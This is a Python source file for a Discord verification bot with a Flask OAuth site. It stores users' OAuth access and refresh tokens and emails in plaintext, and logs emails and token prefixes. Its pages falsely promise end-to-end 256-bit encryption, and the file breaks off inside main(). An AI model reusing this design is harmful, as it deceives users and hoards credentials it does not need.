#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
                    🔐 ANION VERIFICATION SYSTEM v3.0
                    Server-Level OAuth Verification
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import json
import sqlite3
import secrets
import requests
import threading
import asyncio
import logging
from datetime import datetime, timedelta
from flask import Flask, request, redirect, render_template_string, jsonify
from flask_cors import CORS
from dotenv import load_dotenv

import discord
from discord.ext import commands
from discord import app_commands
from discord.ui import View, Button

load_dotenv()

# ═════════════════════════════════════════════════════════════════════════════
# LOGGING
# ═════════════════════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('/data/bot.log', encoding='utf-8')
    ]
)
logger = logging.getLogger('AnionBot')

# ═════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═════════════════════════════════════════════════════════════════════════════

TOKEN = os.getenv('DISCORD_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI', 'https://edith.up.railway.app/callback')
DB_PATH = os.getenv('DB_PATH', '/data')
FLASK_SECRET = os.getenv('FLASK_SECRET', secrets.token_urlsafe(32))
PORT = int(os.getenv('PORT', 5000))

if not TOKEN or not CLIENT_ID or not CLIENT_SECRET:
    logger.error("❌ Missing required environment variables!")
    sys.exit(1)

os.makedirs(DB_PATH, exist_ok=True)
DB_FILE = os.path.join(DB_PATH, 'verification.db')

logger.info(f"✅ Token: {TOKEN[:15]}...")
logger.info(f"✅ Client ID: {CLIENT_ID}")
logger.info(f"✅ Redirect URI: {REDIRECT_URI}")
logger.info(f"✅ Database: {DB_FILE}")
logger.info(f"✅ Port: {PORT}")

# ═════════════════════════════════════════════════════════════════════════════
# DATABASE - Server Level
# ═════════════════════════════════════════════════════════════════════════════

conn = sqlite3.connect(DB_FILE, check_same_thread=False)
conn.row_factory = sqlite3.Row
c = conn.cursor()

# Guild settings
c.execute("""
    CREATE TABLE IF NOT EXISTS guild_settings (
        guild_id TEXT PRIMARY KEY,
        verified_role_id TEXT,
        unverified_role_id TEXT,
        log_channel_id TEXT,
        verification_channel_id TEXT
    )
""")

# Server-level verified users
c.execute("""
    CREATE TABLE IF NOT EXISTS verified_users (
        user_id TEXT,
        guild_id TEXT,
        username TEXT,
        email TEXT,
        access_token TEXT,
        refresh_token TEXT,
        verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, guild_id)
    )
""")

# OAuth tokens
c.execute("""
    CREATE TABLE IF NOT EXISTS oauth_tokens (
        user_id TEXT,
        guild_id TEXT,
        access_token TEXT,
        refresh_token TEXT,
        expires_at TIMESTAMP,
        PRIMARY KEY (user_id, guild_id)
    )
""")

conn.commit()
logger.info("✅ Database ready")

def db_execute(query, params=()):
    try:
        c.execute(query, params)
        conn.commit()
        return c
    except Exception as e:
        logger.error(f"❌ DB Error: {e}")
        return None

def db_fetch_one(query, params=()):
    try:
        c.execute(query, params)
        return c.fetchone()
    except Exception as e:
        logger.error(f"❌ DB Error: {e}")
        return None

def db_fetch_all(query, params=()):
    try:
        c.execute(query, params)
        return c.fetchall()
    except Exception as e:
        logger.error(f"❌ DB Error: {e}")
        return []

def db_delete(query, params=()):
    try:
        c.execute(query, params)
        conn.commit()
        return c
    except Exception as e:
        logger.error(f"❌ DB Error: {e}")
        return None

# ═════════════════════════════════════════════════════════════════════════════
# FLASK APP - OAUTH + SUCCESS PAGE
# ═════════════════════════════════════════════════════════════════════════════

flask_app = Flask(__name__)
flask_app.secret_key = FLASK_SECRET
CORS(flask_app)

@flask_app.route('/')
def index():
    return redirect('/verify')

@flask_app.route('/verify')
def verify_page():
    """Beautiful verification landing page"""
    guild_id = request.args.get('guild_id')
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔐 Secure Verification</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
            
            * { margin: 0; padding: 0; box-sizing: border-box; }
            
            body {
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
                background: #0a0a0f;
                color: #ffffff;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                position: relative;
            }
            
            .bg-gradient {
                position: fixed;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(ellipse at 30% 50%, rgba(88, 101, 242, 0.08) 0%, transparent 60%),
                            radial-gradient(ellipse at 70% 50%, rgba(118, 75, 162, 0.06) 0%, transparent 60%);
                animation: bgPulse 8s ease-in-out infinite alternate;
                z-index: 0;
            }
            
            @keyframes bgPulse {
                0% { transform: scale(1) rotate(0deg); }
                100% { transform: scale(1.1) rotate(3deg); }
            }
            
            .container {
                position: relative;
                z-index: 1;
                max-width: 480px;
                width: 100%;
                padding: 40px 30px;
                background: rgba(20, 20, 30, 0.85);
                backdrop-filter: blur(24px);
                -webkit-backdrop-filter: blur(24px);
                border-radius: 24px;
                border: 1px solid rgba(255, 255, 255, 0.06);
                box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
                text-align: center;
                animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
                opacity: 0;
                transform: translateY(30px);
            }
            
            @keyframes slideUp {
                to { opacity: 1; transform: translateY(0); }
            }
            
            .shield-icon {
                font-size: 56px;
                margin-bottom: 16px;
                display: inline-block;
                animation: float 3s ease-in-out infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0px); }
                50% { transform: translateY(-10px); }
            }
            
            h1 {
                font-size: 28px;
                font-weight: 800;
                background: linear-gradient(135deg, #ffffff 30%, #8b8cf7 100%);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 8px;
                letter-spacing: -0.5px;
            }
            
            .subtitle {
                font-size: 14px;
                color: rgba(255, 255, 255, 0.5);
                font-weight: 400;
                margin-bottom: 28px;
                letter-spacing: 0.3px;
            }
            
            .security-badge {
                display: inline-flex;
                align-items: center;
                gap: 8px;
                background: rgba(88, 101, 242, 0.12);
                border: 1px solid rgba(88, 101, 242, 0.2);
                padding: 8px 16px;
                border-radius: 100px;
                font-size: 11px;
                font-weight: 600;
                color: #8b8cf7;
                margin-bottom: 24px;
                letter-spacing: 0.5px;
                text-transform: uppercase;
            }
            
            .security-badge .dot {
                width: 6px;
                height: 6px;
                border-radius: 50%;
                background: #4CAF50;
                animation: pulseDot 2s infinite;
            }
            
            @keyframes pulseDot {
                0%, 100% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.5; transform: scale(0.8); }
            }
            
            .features {
                display: flex;
                flex-direction: column;
                gap: 10px;
                margin-bottom: 28px;
                text-align: left;
            }
            
            .feature-item {
                display: flex;
                align-items: center;
                gap: 12px;
                padding: 10px 14px;
                background: rgba(255, 255, 255, 0.03);
                border-radius: 12px;
                border: 1px solid rgba(255, 255, 255, 0.04);
                font-size: 13px;
                color: rgba(255, 255, 255, 0.7);
                transition: all 0.3s ease;
            }
            
            .feature-item:hover {
                background: rgba(255, 255, 255, 0.06);
                border-color: rgba(88, 101, 242, 0.15);
            }
            
            .feature-item .icon {
                font-size: 18px;
                flex-shrink: 0;
                width: 28px;
                text-align: center;
            }
            
            .btn-verify {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 12px;
                width: 100%;
                padding: 16px 32px;
                background: linear-gradient(135deg, #5865F2, #4752c4);
                color: white;
                border: none;
                border-radius: 14px;
                font-size: 16px;
                font-weight: 700;
                cursor: pointer;
                text-decoration: none;
                transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
                position: relative;
                overflow: hidden;
                font-family: 'Inter', sans-serif;
            }
            
            .btn-verify::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
                transition: left 0.6s ease;
            }
            
            .btn-verify:hover::before {
                left: 100%;
            }
            
            .btn-verify:hover {
                transform: translateY(-2px);
                box-shadow: 0 12px 40px rgba(88, 101, 242, 0.35);
            }
            
            .btn-verify:active {
                transform: scale(0.98);
            }
            
            .btn-verify .arrow {
                font-size: 20px;
                transition: transform 0.3s ease;
            }
            
            .btn-verify:hover .arrow {
                transform: translateX(4px);
            }
            
            .footer-text {
                margin-top: 20px;
                font-size: 11px;
                color: rgba(255, 255, 255, 0.2);
                letter-spacing: 0.5px;
            }
            
            .particle {
                position: fixed;
                border-radius: 50%;
                pointer-events: none;
                z-index: 0;
                background: rgba(88, 101, 242, 0.15);
                animation: floatParticle 20s infinite linear;
            }
            
            @keyframes floatParticle {
                0% { transform: translate(0, 0) scale(1); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translate(100px, -100px) scale(0); opacity: 0; }
            }
            
            @media (max-width: 480px) {
                .container { padding: 30px 20px; margin: 16px; }
                h1 { font-size: 24px; }
                .btn-verify { font-size: 15px; padding: 14px 24px; }
            }
        </style>
    </head>
    <body>
        <div class="bg-gradient"></div>
        
        <div class="particle" style="width:4px;height:4px;top:10%;left:5%;animation-duration:25s;"></div>
        <div class="particle" style="width:6px;height:6px;top:30%;right:8%;animation-duration:18s;animation-delay:3s;"></div>
        <div class="particle" style="width:3px;height:3px;bottom:20%;left:10%;animation-duration:30s;animation-delay:5s;"></div>
        <div class="particle" style="width:5px;height:5px;bottom:40%;right:5%;animation-duration:22s;animation-delay:7s;"></div>
        
        <div class="container">
            <div class="shield-icon">🛡️</div>
            <h1>Secure Verification</h1>
            <p class="subtitle">Advanced Identity Verification Protocol</p>
            
            <div class="security-badge">
                <span class="dot"></span>
                End-to-End Encrypted • 256-bit
            </div>
            
            <div class="features">
                <div class="feature-item">
                    <span class="icon">🔐</span>
                    <span>Discord Identity Verification</span>
                </div>
                <div class="feature-item">
                    <span class="icon">📧</span>
                    <span>Email Address Confirmation</span>
                </div>
                <div class="feature-item">
                    <span class="icon">🏰</span>
                    <span>Server Membership Validation</span>
                </div>
                <div class="feature-item">
                    <span class="icon">⚡</span>
                    <span>Instant Role Assignment</span>
                </div>
            </div>
            
            <a href="/oauth?guild_id={{ guild_id }}" class="btn-verify">
                <span>Verify with Discord</span>
                <span class="arrow">➜</span>
            </a>
            
            <div class="footer-text">
                🔒 Your data is encrypted and never shared
            </div>
        </div>
    </body>
    </html>
    """, guild_id=guild_id or '')

@flask_app.route('/oauth')
def oauth():
    """Redirect to Discord OAuth"""
    guild_id = request.args.get('guild_id')
    if not guild_id:
        return "❌ No guild_id provided", 400
    
    oauth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds"
        f"&state={guild_id}"
    )
    return redirect(oauth_url)

@flask_app.route('/callback')
def callback():
    """OAuth callback - Exchange code for token"""
    code = request.args.get('code')
    guild_id = request.args.get('state')
    
    logger.info(f"📥 Callback received - Code: {code[:20] if code else 'None'}..., Guild: {guild_id}")
    
    if not code:
        return "❌ No code provided", 400
    if not guild_id:
        return "❌ No guild_id provided", 400
    
    # Exchange code for token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    try:
        resp = requests.post('https://discord.com/api/oauth2/token', data=data, timeout=10)
        token_data = resp.json()
        logger.info("✅ Token exchange successful")
    except Exception as e:
        logger.error(f"❌ Token exchange failed: {e}")
        return f"❌ Token exchange failed: {e}", 400
    
    if 'access_token' not in token_data:
        logger.error(f"❌ No access token: {token_data}")
        return f"❌ No access token: {token_data}", 400
    
    access_token = token_data['access_token']
    refresh_token = token_data.get('refresh_token')
    expires_in = token_data.get('expires_in', 604800)
    expires_at = (datetime.now() + timedelta(seconds=expires_in)).isoformat()
    
    # Get user data
    headers = {'Authorization': f'Bearer {access_token}'}
    
    try:
        user_resp = requests.get('https://discord.com/api/users/@me', headers=headers, timeout=10)
        user_data = user_resp.json()
        logger.info(f"👤 User: {user_data.get('username')}")
    except Exception as e:
        logger.error(f"❌ Failed to get user data: {e}")
        return f"❌ Failed to get user data: {e}", 400
    
    # Get guilds
    try:
        guilds_resp = requests.get('https://discord.com/api/users/@me/guilds', headers=headers, timeout=10)
        guilds_data = guilds_resp.json()
    except Exception as e:
        logger.error(f"❌ Failed to get guilds: {e}")
        guilds_data = []
    
    # Save to database (server-level)
    db_execute("""
        INSERT OR REPLACE INTO verified_users 
        (user_id, guild_id, username, email, access_token, refresh_token)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (
        user_data.get('id'),
        guild_id,
        user_data.get('username'),
        user_data.get('email', ''),
        access_token,
        refresh_token
    ))
    
    # Save tokens
    db_execute("""
        INSERT OR REPLACE INTO oauth_tokens
        (user_id, guild_id, access_token, refresh_token, expires_at)
        VALUES (?, ?, ?, ?, ?)
    """, (
        user_data.get('id'),
        guild_id,
        access_token,
        refresh_token,
        expires_at
    ))
    
    logger.info("=" * 70)
    logger.info("✅ USER VERIFIED!")
    logger.info("=" * 70)
    logger.info(f"  👤 User: {user_data.get('username')}")
    logger.info(f"  🆔 ID: {user_data.get('id')}")
    logger.info(f"  📧 Email: {user_data.get('email', 'N/A')}")
    logger.info(f"  🏰 Guild: {guild_id}")
    logger.info(f"  🔑 Token: {access_token[:30]}...")
    logger.info("=" * 70)
    
    # Assign role via bot (async)
    if bot_instance:
        asyncio.run_coroutine_threadsafe(
            assign_verified_role(user_data.get('id'), guild_id, user_data.get('username')),
            bot_instance.loop
        )
    
    # Get guild name
    guild_name = guild_id
    if bot_instance:
        guild = bot_instance.get_guild(int(guild_id))
        if guild:
            guild_name = guild.name
    
    # Show futuristic success page
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>✅ Verification Complete</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap');
            
            * { margin: 0; padding: 0; box-sizing: border-box; }
            
            body {
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
                background: #0a0a0f;
                color: #ffffff;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
            }
            
            .bg-gradient {
                position: fixed;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(ellipse at 70% 30%, rgba(76, 175, 80, 0.06) 0%, transparent 60%),
                            radial-gradient(ellipse at 30% 70%, rgba(88, 101, 242, 0.04) 0%, transparent 60%);
                animation: bgPulse 10s ease-in-out infinite alternate;
                z-index: 0;
            }
            
            @keyframes bgPulse {
                0% { transform: scale(1) rotate(0deg); }
                100% { transform: scale(1.05) rotate(-2deg); }
            }
            
            .container {
                position: relative;
                z-index: 1;
                max-width: 520px;
                width: 100%;
                padding: 50px 40px;
                background: rgba(20, 20, 30, 0.85);
                backdrop-filter: blur(24px);
                -webkit-backdrop-filter: blur(24px);
                border-radius: 28px;
                border: 1px solid rgba(76, 175, 80, 0.15);
                box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6), 0 0 60px rgba(76, 175, 80, 0.05);
                text-align: center;
                animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
                opacity: 0;
                transform: translateY(30px);
            }
            
            @keyframes slideUp {
                to { opacity: 1; transform: translateY(0); }
            }
            
            .success-icon {
                font-size: 72px;
                margin-bottom: 12px;
                display: inline-block;
                animation: successPulse 2s ease-in-out infinite;
            }
            
            @keyframes successPulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.05); }
            }
            
            .glow-ring {
                display: inline-block;
                padding: 4px;
                border-radius: 50%;
                background: linear-gradient(135deg, #4CAF50, #66BB6A);
                box-shadow: 0 0 60px rgba(76, 175, 80, 0.2);
                margin-bottom: 16px;
            }
            
            h1 {
                font-size: 32px;
                font-weight: 900;
                background: linear-gradient(135deg, #ffffff 30%, #a5d6a7 100%);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 8px;
                letter-spacing: -0.5px;
            }
            
            .subtitle {
                font-size: 14px;
                color: rgba(255, 255, 255, 0.4);
                font-weight: 400;
                margin-bottom: 28px;
                letter-spacing: 0.5px;
            }
            
            .verified-badge {
                display: inline-flex;
                align-items: center;
                gap: 10px;
                background: rgba(76, 175, 80, 0.12);
                border: 1px solid rgba(76, 175, 80, 0.2);
                padding: 10px 20px;
                border-radius: 100px;
                font-size: 13px;
                font-weight: 600;
                color: #81C784;
                margin-bottom: 28px;
            }
            
            .verified-badge .check {
                font-size: 18px;
            }
            
            .info-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 12px;
                margin-bottom: 28px;
                text-align: left;
            }
            
            .info-card {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid rgba(255, 255, 255, 0.05);
                border-radius: 14px;
                padding: 16px 18px;
                transition: all 0.3s ease;
            }
            
            .info-card:hover {
                background: rgba(255, 255, 255, 0.06);
                border-color: rgba(255, 255, 255, 0.08);
            }
            
            .info-card .label {
                font-size: 10px;
                font-weight: 600;
                color: rgba(255, 255, 255, 0.3);
                text-transform: uppercase;
                letter-spacing: 0.8px;
                margin-bottom: 4px;
            }
            
            .info-card .value {
                font-size: 14px;
                font-weight: 600;
                color: #ffffff;
                word-break: break-all;
            }
            
            .info-card .value.username {
                color: #8b8cf7;
            }
            
            .info-card .value.guild {
                color: #81C784;
            }
            
            .btn-done {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                width: 100%;
                padding: 16px 32px;
                background: linear-gradient(135deg, #4CAF50, #388E3C);
                color: white;
                border: none;
                border-radius: 14px;
                font-size: 16px;
                font-weight: 700;
                cursor: pointer;
                text-decoration: none;
                transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
                font-family: 'Inter', sans-serif;
            }
            
            .btn-done:hover {
                transform: translateY(-2px);
                box-shadow: 0 12px 40px rgba(76, 175, 80, 0.35);
            }
            
            .btn-done:active {
                transform: scale(0.98);
            }
            
            .footer-text {
                margin-top: 16px;
                font-size: 11px;
                color: rgba(255, 255, 255, 0.15);
            }
            
            .particle {
                position: fixed;
                border-radius: 50%;
                pointer-events: none;
                z-index: 0;
                background: rgba(76, 175, 80, 0.1);
                animation: floatParticle 25s infinite linear;
            }
            
            @keyframes floatParticle {
                0% { transform: translate(0, 0) scale(1); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translate(-80px, -120px) scale(0); opacity: 0; }
            }
            
            @media (max-width: 480px) {
                .container { padding: 30px 20px; margin: 16px; }
                h1 { font-size: 26px; }
                .info-grid { grid-template-columns: 1fr; }
                .btn-done { font-size: 15px; padding: 14px 20px; }
            }
        </style>
    </head>
    <body>
        <div class="bg-gradient"></div>
        
        <div class="particle" style="width:4px;height:4px;top:15%;left:8%;animation-duration:22s;"></div>
        <div class="particle" style="width:6px;height:6px;top:25%;right:12%;animation-duration:18s;animation-delay:4s;"></div>
        <div class="particle" style="width:3px;height:3px;bottom:30%;left:15%;animation-duration:28s;animation-delay:6s;"></div>
        
        <div class="container">
            <div class="glow-ring">
                <div class="success-icon">✅</div>
            </div>
            
            <h1>Verification Complete</h1>
            <p class="subtitle">Identity successfully confirmed</p>
            
            <div class="verified-badge">
                <span class="check">✦</span>
                <span>Verified • {{ username }}#{{ discriminator }}</span>
            </div>
            
            <div class="info-grid">
                <div class="info-card">
                    <div class="label">👤 User</div>
                    <div class="value username">{{ username }}</div>
                </div>
                <div class="info-card">
                    <div class="label">🆔 User ID</div>
                    <div class="value">{{ user_id }}</div>
                </div>
                <div class="info-card">
                    <div class="label">📧 Email</div>
                    <div class="value">{{ email }}</div>
                </div>
                <div class="info-card">
                    <div class="label">🏰 Server</div>
                    <div class="value guild">{{ guild_name }}</div>
                </div>
                <div class="info-card" style="grid-column: 1 / -1;">
                    <div class="label">🔑 Verified At</div>
                    <div class="value">{{ verified_at }}</div>
                </div>
            </div>
            
            <a href="https://discord.com/app" class="btn-done">
                <span>🎯</span>
                <span>Return to Discord</span>
            </a>
            
            <div class="footer-text">
                🔒 Your verification status is securely stored
            </div>
        </div>
    </body>
    </html>
    """,
    username=user_data.get('username', 'User'),
    discriminator=user_data.get('discriminator', '0'),
    user_id=user_data.get('id', 'Unknown'),
    email=user_data.get('email', 'Not provided'),
    guild_name=guild_name,
    verified_at=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    )

async def assign_verified_role(user_id, guild_id, username):
    """Assign verified role to user"""
    if not bot_instance:
        logger.warning("⚠️ Bot instance not available")
        return
    
    guild = bot_instance.get_guild(int(guild_id))
    if not guild:
        logger.warning(f"❌ Guild {guild_id} not found")
        return
    
    member = guild.get_member(int(user_id))
    if not member:
        logger.warning(f"❌ Member {user_id} not found in guild")
        return
    
    settings = db_fetch_one("SELECT verified_role_id FROM guild_settings WHERE guild_id=?", (guild_id,))
    if not settings or not settings['verified_role_id']:
        logger.warning(f"❌ No verified role set for guild {guild_id}")
        return
    
    role = guild.get_role(int(settings['verified_role_id']))
    if not role:
        logger.warning(f"❌ Role {settings['verified_role_id']} not found")
        return
    
    try:
        await member.add_roles(role)
        logger.info(f"✅ Assigned verified role to {username} in {guild.name}")
        
        # Remove unverified role if exists
        unverified_settings = db_fetch_one("SELECT unverified_role_id FROM guild_settings WHERE guild_id=?", (guild_id,))
        if unverified_settings and unverified_settings['unverified_role_id']:
            unverified_role = guild.get_role(int(unverified_settings['unverified_role_id']))
            if unverified_role and unverified_role in member.roles:
                await member.remove_roles(unverified_role)
        
        # Log
        log_settings = db_fetch_one("SELECT log_channel_id FROM guild_settings WHERE guild_id=?", (guild_id,))
        if log_settings and log_settings['log_channel_id']:
            channel = guild.get_channel(int(log_settings['log_channel_id']))
            if channel:
                embed = discord.Embed(
                    title="✅ User Verified",
                    description=f"**{member.mention}** has been verified!",
                    color=discord.Color.green()
                )
                embed.add_field(name="Username", value=member.display_name, inline=True)
                embed.add_field(name="User ID", value=member.id, inline=True)
                embed.add_field(name="Verified At", value=datetime.now().strftime('%Y-%m-%d %H:%M:%S'), inline=True)
                await channel.send(embed=embed)
                
    except Exception as e:
        logger.error(f"❌ Failed to assign role: {e}")

# ═════════════════════════════════════════════════════════════════════════════
# DISCORD BOT
# ═════════════════════════════════════════════════════════════════════════════

class VerifyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
    
    async def setup_hook(self):
        await self.register_commands()
        await self.tree.sync()
        logger.info(f'✅ Commands synced!')
    
    async def register_commands(self):
        
        # ─── SETUP VERIFY COMMAND ──────────────────────────────────────
        
        @self.tree.command(name="setupverify", description="⚙️ Setup verification system (Admin)")
        @app_commands.default_permissions(administrator=True)
        async def setupverify(interaction: discord.Interaction):
            """Setup verification with beautiful button"""
            guild = interaction.guild
            
            # Create roles if not exist
            verified_role = discord.utils.get(guild.roles, name="Verified")
            if not verified_role:
                verified_role = await guild.create_role(name="Verified", color=discord.Color.green())
            
            unverified_role = discord.utils.get(guild.roles, name="Unverified")
            if not unverified_role:
                unverified_role = await guild.create_role(name="Unverified", color=discord.Color.red())
            
            # Create category
            category = discord.utils.get(guild.categories, name="🔐 Verification")
            if not category:
                category = await guild.create_category("🔐 Verification")
            
            # Create channel
            channel = discord.utils.get(guild.channels, name="🔐-verify-here")
            if not channel:
                channel = await guild.create_text_channel("🔐-verify-here", category=category)
            
            # Save settings
            db_execute("""
                INSERT OR REPLACE INTO guild_settings 
                (guild_id, verified_role_id, unverified_role_id, verification_channel_id)
                VALUES (?, ?, ?, ?)
            """, (str(guild.id), str(verified_role.id), str(unverified_role.id), str(channel.id)))
            
            # Lockdown all channels for unverified
            for ch in guild.channels:
                try:
                    await ch.set_permissions(unverified_role, read_messages=False)
                    await ch.set_permissions(verified_role, read_messages=True, send_messages=True)
                except:
                    pass
            
            # ─── BEAUTIFUL VERIFY BUTTON ──────────────────────────────
            
            verify_url = f"https://edith.up.railway.app/verify?guild_id={guild.id}"
            
            embed = discord.Embed(
                title="🔐 **SERVER VERIFICATION REQUIRED**",
                description=(
                    "**Welcome to the server!**\n\n"
                    "To access all channels and features, you need to verify your identity.\n\n"
                    "🔒 **This process is secure and encrypted.**\n"
                    "✅ **Only takes a few seconds.**\n"
                    "🛡️ **Your data is protected.**"
                ),
                color=0x5865F2,
                timestamp=datetime.now()
            )
            embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
            embed.set_footer(text="Anion Verification System • Secure • Encrypted")
            
            embed.add_field(
                name="📋 What you'll get:",
                value="✅ Full access to all channels\n✅ Verified role\n✅ Server member status",
                inline=False
            )
            embed.add_field(
                name="🔒 Privacy Policy:",
                value="We only collect your Discord ID, username, and email for verification purposes.",
                inline=False
            )
            
            # Beautiful button
            view = View()
            button = Button(
                label="🛡️ Verify Now",
                url=verify_url,
                style=discord.ButtonStyle.success,
                emoji="🔐"
            )
            view.add_item(button)
            
            await channel.send(embed=embed, view=view)
            
            # Confirm setup
            embed = discord.Embed(
                title="✅ Verification Setup Complete!",
                description=(
                    f"✅ Verified Role: {verified_role.mention}\n"
                    f"✅ Unverified Role: {unverified_role.mention}\n"
                    f"✅ Verification Channel: {channel.mention}\n\n"
                    f"🔒 Server is now locked for unverified users!"
                ),
                color=discord.Color.green()
            )
            await interaction.response.send_message(embed=embed)
        
        # ─── SET VERIFIED ROLE ──────────────────────────────────────────
        
        @self.tree.command(name="setverifiedrole", description="⚙️ Set verified role (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(role="Role for verified users")
        async def setverifiedrole(interaction: discord.Interaction, role: discord.Role):
            db_execute("""
                INSERT OR REPLACE INTO guild_settings (guild_id, verified_role_id)
                VALUES (?, ?)
            """, (str(interaction.guild.id), str(role.id)))
            embed = discord.Embed(title="✅ Verified Role Set", description=f"Verified role set to {role.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)
        
        # ─── SET UNVERIFIED ROLE ──────────────────────────────────────
        
        @self.tree.command(name="setunverifiedrole", description="⚙️ Set unverified role (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(role="Role for unverified users")
        async def setunverifiedrole(interaction: discord.Interaction, role: discord.Role):
            db_execute("""
                INSERT OR REPLACE INTO guild_settings (guild_id, unverified_role_id)
                VALUES (?, ?)
            """, (str(interaction.guild.id), str(role.id)))
            embed = discord.Embed(title="✅ Unverified Role Set", description=f"Unverified role set to {role.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)
        
        # ─── SET LOG CHANNEL ──────────────────────────────────────────
        
        @self.tree.command(name="setlogchannel", description="⚙️ Set log channel (Admin)")
        @app_commands.default_permissions(administrator=True)
        @app_commands.describe(channel="Channel for logs")
        async def setlogchannel(interaction: discord.Interaction, channel: discord.TextChannel):
            db_execute("""
                INSERT OR REPLACE INTO guild_settings (guild_id, log_channel_id)
                VALUES (?, ?)
            """, (str(interaction.guild.id), str(channel.id)))
            embed = discord.Embed(title="✅ Log Channel Set", description=f"Log channel set to {channel.mention}", color=discord.Color.green())
            await interaction.response.send_message(embed=embed)
        
        # ─── VERIFY STATUS ─────────────────────────────────────────────
        
        @self.tree.command(name="verifystatus", description="🔐 Check your verification status")
        async def verifystatus(interaction: discord.Interaction):
            user_id = str(interaction.user.id)
            guild_id = str(interaction.guild.id)
            
            verified = db_fetch_one("SELECT * FROM verified_users WHERE user_id=? AND guild_id=?", (user_id, guild_id))
            
            if verified:
                embed = discord.Embed(
                    title="✅ Verified",
                    description="You are verified in this server!",
                    color=discord.Color.green()
                )
                embed.add_field(name="Verified At", value=verified['verified_at'], inline=False)
            else:
                embed = discord.Embed(
                    title="❌ Not Verified",
                    description="Use the verify button to get verified.",
                    color=discord.Color.red()
                )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # ─── PING ──────────────────────────────────────────────────────
        
        @self.tree.command(name="ping", description="🏓 Check bot latency")
        async def ping(interaction: discord.Interaction):
            await interaction.response.send_message(f"🏓 Pong! {round(self.latency * 1000)}ms")
    
    async def on_ready(self):
        logger.info("=" * 70)
        logger.info("✅✅✅ BOT IS ONLINE! ✅✅✅")
        logger.info("=" * 70)
        logger.info(f"📡 Name: {self.user.name}")
        logger.info(f"🆔 ID: {self.user.id}")
        logger.info(f"🏰 Servers: {len(self.guilds)}")
        for guild in self.guilds:
            logger.info(f"   - {guild.name} ({guild.id})")
        logger.info("=" * 70)
        logger.info("📋 Commands:")
        logger.info("   /setupverify - Setup verification (Admin)")
        logger.info("   /setverifiedrole - Set verified role (Admin)")
        logger.info("   /setunverifiedrole - Set unverified role (Admin)")
        logger.info("   /setlogchannel - Set log channel (Admin)")
        logger.info("   /verifystatus - Check status")
        logger.info("   /ping - Check latency")
        logger.info("=" * 70)
    
    async def on_member_remove(self, member):
        """When member leaves, remove from database (server-level)"""
        db_delete("DELETE FROM verified_users WHERE user_id=? AND guild_id=?", (str(member.id), str(member.guild.id)))
        logger.info(f"🗑️ Removed {member.display_name} from verified database (left server)")

# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

bot_instance = None

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, debug=False)

async def main():
    global bot_instance
    logger.info("🚀 Starting Verification System...")
    logger.info("=" * 70)
    
